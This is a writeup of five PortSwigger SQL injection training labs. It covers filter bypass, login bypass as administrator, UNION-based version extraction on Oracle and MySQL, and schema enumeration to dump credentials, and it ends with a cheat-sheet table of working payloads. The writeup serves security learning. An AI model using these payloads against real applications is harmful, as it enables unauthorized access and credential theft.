# PortSwigger SQL Injection Labs — Writeup
 
**Author:** Ramji R  
**Platform:** PortSwigger Web Security Academy  
**Category:** SQL Injection  
**Date:** June 2026
 
---
 
## Lab 1 — SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data
 
**Difficulty:** Apprentice
 
### Objective
Retrieve hidden/unreleased products by manipulating the `category` filter parameter.
 
### Vulnerability
The application builds a SQL query by directly concatenating user input:
 
```sql
SELECT * FROM products WHERE category = 'INPUT' AND released = 1
```
 
The `released = 1` condition hides unreleased products. Since the input is unsanitised, it is injectable.
 
### Exploit
 
Injected into the `category` URL parameter:
 
```
/filter?category='+OR+1=1--
```
 
Resulting query:
 
```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```
 
`OR 1=1` is always true, so all rows are returned. `--` comments out the `AND released = 1` restriction entirely.
 
---
 
## Lab 2 — SQL Injection Vulnerability Allowing Login Bypass
 
**Difficulty:** Apprentice
 
### Objective
Log in as the `administrator` user without knowing the password.
 
### Vulnerability
The login form passes credentials directly into a SQL query:
 
```sql
SELECT * FROM users WHERE username = 'INPUT' AND password = 'INPUT'
```
 
The password check can be bypassed entirely by injecting into the username field.
 
### Exploit
 
Username field:
```
administrator'--
```
 
Password field: anything (ignored after comment)
 
Resulting query:
 
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'anything'
```
 
The `--` comments out the password check. The query returns the administrator row and the session is granted.
 
---
 
## Lab 3 — SQL Injection Attack, Querying the Database Type and Version on Oracle
 
**Difficulty:** Practitioner
 
### Objective
Leak the Oracle database version string using a UNION-based attack.
 
### Oracle-specific Notes
- Oracle requires every `SELECT` to have a `FROM` clause — `FROM dual` is used as a dummy table
- Comment character is `--`
- Version function: `v$version` (a system view, not a function)
### Steps
 
**Step 1 — Determine column count:**
 
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← error → 2 columns
```
 
**Step 2 — Confirm string-compatible columns:**
 
```
' UNION SELECT 'a','b' FROM dual--
```
 
**Step 3 — Extract version:**
 
```
' UNION SELECT banner, NULL FROM v$version--
```
 
The Oracle version banner was returned in the page output.
 
---
 
## Lab 4 — SQL Injection Attack, Querying the Database Type and Version on MySQL and Microsoft
 
**Difficulty:** Practitioner
 
### Objective
Leak the MySQL/MSSQL version string using a UNION-based attack.
 
### MySQL-specific Notes
- Comment character is `--` but requires a trailing space: `-- -` or use `#`
- Version function: `@@version`
### Steps
 
**Step 1 — Determine column count:**
 
```
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   ← error → 2 columns
```
 
**Step 2 — Confirm string-compatible columns:**
 
```
' UNION SELECT 'a','a'-- -
```
 
**Step 3 — Extract version:**
 
```
' UNION SELECT @@version, NULL-- -
```
 
The MySQL version string was returned in the product listing output.
 
---
 
## Lab 5 — SQL Injection Attack, Listing the Database Contents on Non-Oracle Databases
 
**Difficulty:** Practitioner
 
### Objective
Enumerate the schema using `information_schema`, extract credentials from a hidden users table, and log in as `administrator`.
 
### Steps
 
**Step 1 — Confirm 2 columns, both strings:**
 
```
' UNION SELECT 'a','b'--
```
 
**Step 2 — List all tables:**
 
```
' UNION SELECT table_name, NULL FROM information_schema.tables--
```
 
From the large dump of table names, the target was identified: `users_dnzphi` (PortSwigger randomises the suffix per lab instance).
 
**Step 3 — List columns of the target table:**
 
```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_dnzphi'--
```
 
Returned the username and password column names.
 
**Step 4 — Dump credentials:**
 
```
' UNION SELECT username_col, password_col FROM users_dnzphi--
```
 
The `administrator` entry and its plaintext password appeared in the product listing.
 
**Step 5 — Login:**
 
Navigated to `/login` and authenticated as `administrator` using the dumped password.
 
---
 
## Techniques & Cheat Sheet
 
| Technique | Payload |
|---|---|
| Hidden data retrieval | `' OR 1=1--` |
| Login bypass | `admin'--` in username field |
| Column count | `' ORDER BY N--` (increment until error) |
| String column test | `' UNION SELECT 'a','b'--` |
| Version — MySQL/MSSQL | `' UNION SELECT @@version,NULL--` |
| Version — Oracle | `' UNION SELECT banner,NULL FROM v$version--` |
| List tables | `' UNION SELECT table_name,NULL FROM information_schema.tables--` |
| List columns | `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='x'--` |
| Dump data | `' UNION SELECT col1,col2 FROM tablename--` |
| MySQL comment | `-- -` or `#` |
| Oracle dummy table | `FROM dual` (required in all SELECT statements) |
 
---
 
